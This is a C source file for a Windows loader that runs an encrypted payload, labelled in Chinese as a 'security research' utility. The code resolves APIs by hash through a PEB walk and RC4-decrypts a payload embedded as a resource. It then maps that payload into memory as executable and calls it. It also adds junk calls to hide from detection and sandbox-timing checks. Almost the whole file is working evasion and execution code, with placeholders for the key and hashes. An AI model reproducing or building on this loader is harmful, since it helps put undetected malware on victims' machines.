/*
 * Utility — 安全研究用途
 */

#include <windows.h>

static unsigned char _key[16] = { /* __KEY_PLACEHOLDER__ */ };
static const unsigned char _xb[1] = { /* __XOR_BYTE__ */ };

/* __HASHES__ */

typedef LPVOID  (WINAPI *tpVA)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL    (WINAPI *tpVP)(LPVOID,SIZE_T,DWORD,PDWORD);
typedef HRSRC   (WINAPI *tpFR)(HMODULE,LPCSTR,LPCSTR);
typedef HGLOBAL (WINAPI *tpLR)(HMODULE,HRSRC);
typedef LPVOID  (WINAPI *tpLK)(HGLOBAL);
typedef DWORD   (WINAPI *tpSR)(HMODULE,HRSRC);
typedef VOID    (WINAPI *tpSl)(DWORD);

/* ══════════════════ Hash ═══════════════ */

static DWORD __cdecl _h(const char* s) {
    DWORD v=0x1505; while(*s){v+=(v<<5); v+=(unsigned char)*s++;} return v;
}

/* ══════════════════ 导出解析 ═══════════════ */

static PVOID __cdecl _x(PVOID b, DWORD t) {
    if(!b) return NULL;
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)b+d->e_lfanew);
    IMAGE_DATA_DIRECTORY* dd=&n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if(!dd->VirtualAddress) return NULL;
    PIMAGE_EXPORT_DIRECTORY e=(PIMAGE_EXPORT_DIRECTORY)((BYTE*)b+dd->VirtualAddress);
    DWORD* ns=(DWORD*)((BYTE*)b+e->AddressOfNames);
    WORD*  os=(WORD*) ((BYTE*)b+e->AddressOfNameOrdinals);
    DWORD* fs=(DWORD*)((BYTE*)b+e->AddressOfFunctions);
    DWORD i=0; while(i<e->NumberOfNames){
        if(_h((const char*)((BYTE*)b+ns[i]))==t)return (PVOID)((BYTE*)b+fs[os[i]]); i++;}
    return NULL;
}

/* ══════════════════ PEB模块 ═══════════════ */

static PVOID __cdecl _m(int k32) {
    PVOID p; PVOID l; LIST_ENTRY* h;
#ifdef _WIN64
    { __asm__("movq %%gs:0x60, %0":"=r"(p)); }
    l=(PVOID)(*(BYTE**)((BYTE*)p+0x18)); h=(LIST_ENTRY*)((BYTE*)l+0x10);
#else
    { __asm__("movl %%fs:0x30, %0":"=r"(p)); }
    l=(PVOID)(*(BYTE**)((BYTE*)p+0x0C)); h=(LIST_ENTRY*)((BYTE*)l+0x0C);
#endif
    LIST_ENTRY* c=h->Flink;
    for(;c&&c!=h;c=c->Flink){
#ifdef _WIN64
        WCHAR* nm=*(WCHAR**)((BYTE*)c+0x60); PVOID d=*(PVOID*)((BYTE*)c+0x30);
#else
        WCHAR* nm=*(WCHAR**)((BYTE*)c+0x3C); PVOID d=*(PVOID*)((BYTE*)c+0x18);
#endif
        if(!nm||!d) continue;
        WCHAR a=nm[0]|0x20,b=nm[1]|0x20,C=nm[2]|0x20,D=nm[3]|0x20,E=nm[4]|0x20,F=nm[5];
        if(k32){
            if(a=='k'&&b=='e'&&C=='r'&&D=='n'&&nm[6]=='3'&&nm[7]=='2') return d;
        } else {
            if(a=='n'&&b=='t'&&C=='d'&&D=='l'&&E=='l'&&F=='.') return d;
        }
    }
    return NULL;
}

/* ══════════════════ RC4 ═══════════════ */

static void __cdecl _r(unsigned char* d, int dl, const unsigned char* k, int kl) {
    unsigned char t[256]; int i,j=0;
    for(i=0;i<256;i++)t[i]=(unsigned char)i;
    for(i=0;i<256;i++){j=(unsigned char)(j+t[i]+k[i%kl]);unsigned char x=t[i];t[i]=t[j];t[j]=x;}
    i=j=0; int n=0;
    do{i=(unsigned char)(i+1);j=(unsigned char)(j+t[i]);unsigned char x=t[i];t[i]=t[j];t[j]=x;d[n]^=t[(unsigned char)(t[i]+t[j])];n++;}while(n<dl);
}

/* ══════════════════ 密钥XOR还原/混淆 ═══════════════ */

static void __cdecl _kflip(unsigned char* k, int kl, unsigned char mask) {
    int i; for(i=0;i<kl;i++) k[i]^=mask;
}

/* ══════════════════ 资源读取 (PEB解析) ═══════════════ */

static BYTE* __cdecl _ld(PVOID k32, DWORD* sz, tpFR pfr, tpLR plr, tpLK plk, tpSR psr) {
    tpFR F=pfr?pfr:(tpFR)_x(k32,HX_FindResourceA);
    tpSR S=psr?psr:(tpSR)_x(k32,HX_SizeofResource);
    tpLR L=plr?plr:(tpLR)_x(k32,HX_LoadResource);
    tpLK K=plk?plk:(tpLK)_x(k32,HX_LockResource);
    if(!F||!L||!K||!S)return NULL;

    HRSRC r=F(NULL,(LPCSTR)101,RT_RCDATA); if(!r)return NULL;
    DWORD s=S(NULL,r); if(!s)return NULL;
    HGLOBAL g=L(NULL,r);
    BYTE* buf=(BYTE*)HeapAlloc(GetProcessHeap(),0,s); if(!buf)return NULL;
    { BYTE* src=(BYTE*)K(g); DWORD i=0; while(i<s){buf[i]=src[i];i++;} }
    *sz=s; return buf;
}

/* ══════════════════ 执行结构 (间接调用打散执行流) ═══════════════ */

typedef struct {
    tpVA valloc;
    tpVP vprot;
    LPVOID region;
    DWORD  size;
    int    ready;
} _ctx;

static int __cdecl _step_copy(_ctx* ctx, BYTE* payload) {
    if(!ctx||!payload||!ctx->valloc) return 0;
    ctx->region = ctx->valloc(NULL, ctx->size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!ctx->region) return 0;
    { BYTE* s=payload,*d=(BYTE*)ctx->region; DWORD i=0; while(i<ctx->size){d[i]=s[i];i++;} }
    SecureZeroMemory(payload, ctx->size);
    HeapFree(GetProcessHeap(),0,payload);
    return 1;
}

static int __cdecl _step_xfinal(_ctx* ctx) {
    if(!ctx||!ctx->region||!ctx->vprot||!ctx->ready) return 0;
    DWORD old;
    if(!ctx->vprot(ctx->region, ctx->size, PAGE_EXECUTE_READ, &old)) return 0;
    ((void(*)())ctx->region)();
    return 1;
}

/* ══════════════════ 垃圾代码块 (环境检查 + 多样化API) ═══════════════ */

static int _j1(void) {
    int v=GetSystemMetrics(0x00000000)+GetSystemMetrics(0x00000001);
    v+=(int)GetSysColor(0x00000005); v+=(int)GetSysColor(0x00000008);
    v+=(int)GetSysColor(0x0000000F); v+=(int)GetDesktopWindow();
    return v&1;
}

static int _j2(void) {
    CHAR b[128]; DWORD s=sizeof(b); int x=0;
    GetComputerNameA(b,&s); s=sizeof(b); GetUserNameA(b,&s);
    GetWindowsDirectoryA(b,sizeof(b)); GetSystemDirectoryA(b,sizeof(b));
    GetTempPathA(sizeof(b),b);
    HKEY k;
    if(RegOpenKeyExA(HKEY_CURRENT_USER,"Control Panel\\Desktop",0,KEY_READ,&k)==0)
    {RegCloseKey(k);x++;}
    if(RegOpenKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",0,KEY_READ,&k)==0)
    {RegCloseKey(k);x++;}
    return x;
}

static void _j3(void) {
    int c=GetSystemMetrics(0x20),r=GetSystemMetrics(0x2A),i,j;
    for(i=0;i<3&&i<c;i++)for(j=0;j<3&&j<r;j++){GetSysColor(1);GetSysColor(2);}
}

static int _j4(void) {
    POINT pt; GetCursorPos(&pt);
    HWND fg=GetForegroundWindow();
    if(fg){RECT rc;GetWindowRect(fg,&rc);}
    DWORD pid=GetCurrentProcessId();
    return (int)(pid&1);
}

static void _j5(void) {
    HDC dc=GetDC(NULL);if(dc){GetDeviceCaps(dc,BITSPIXEL);GetDeviceCaps(dc,HORZRES);ReleaseDC(NULL,dc);}
}

static int _j6(void) {
    ULARGE_INTEGER a,b,c;
    if(GetDiskFreeSpaceExA("C:\\",&a,&b,&c)) return (int)(a.LowPart&3);
    return 0;
}

static void _j7(void) {
    OSVERSIONINFOA o={sizeof(o)}; GetVersionExA(&o);
    int m; SystemParametersInfoA(0x0070,0,&m,0); /* SPI_GETFASTTASKSWITCH */
}

static int _j8(void) {
    LARGE_INTEGER fq, t1, t2;
    if(QueryPerformanceFrequency(&fq)&&QueryPerformanceCounter(&t1)){
        Sleep(0); Sleep(1);
        if(QueryPerformanceCounter(&t2)){
            LONGLONG d=(t2.QuadPart-t1.QuadPart)*1000/fq.QuadPart;
            return (d>=0&&d<=2000)?1:0;
        }
    }
    return 1;
}

static int _j9(void) {
    DWORD tick=GetTickCount();
    Sleep(2); Sleep(0);
    DWORD t2=GetTickCount()-tick;
    return (t2>=2&&t2<=500)?1:0;
}

static void _j10(void) {
    HWND sw=GetShellWindow();
    HWND dw=GetDesktopWindow();
    if(sw&&dw){RECT r1,r2;GetWindowRect(sw,&r1);GetWindowRect(dw,&r2);}
}

/* ══════════════════ WinMain ═══════════════ */

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS) {
    int z=0;
    z+=_j1(); z+=_j2(); _j3(); z+=_j4(); _j5(); z+=_j6(); _j7();
    if(!_j8()||!_j9()) return 0;
    _j10();

    PVOID k32=_m(1); if(!k32) return 0;

    tpVA vA=(tpVA)_x(k32,HX_VirtualAlloc);
    tpVP vP=(tpVP)_x(k32,HX_VirtualProtect);
    tpFR fR=(tpFR)_x(k32,HX_FindResourceA);
    tpLR lR=(tpLR)_x(k32,HX_LoadResource);
    tpLK lK=(tpLK)_x(k32,HX_LockResource);
    tpSR sR=(tpSR)_x(k32,HX_SizeofResource);
    if(!vA||!vP||!fR||!lR||!lK||!sR) return 0;

    z+=_j4(); _j5(); _j3();
    z+=_j1(); z+=_j6();

    DWORD sz=0;
    BYTE* py=_ld(k32,&sz,fR,lR,lK,sR);
    if(!py) return 0;

    _j7(); z+=_j2(); _j10();

    _kflip(_key,16,_xb[0]);
    _r(py,(int)sz,_key,16);
    _kflip(_key,16,_xb[0]);

    z+=_j4(); _j5(); z+=_j9()?1:0;

    _ctx ctx={vA,vP,NULL,sz,0};
    if(!_step_copy(&ctx,py)) return 0;

    z+=_j1(); _j3(); z+=_j8()?1:0; _j7();

    ctx.ready=1;
    _step_xfinal(&ctx);
    return 0;
}
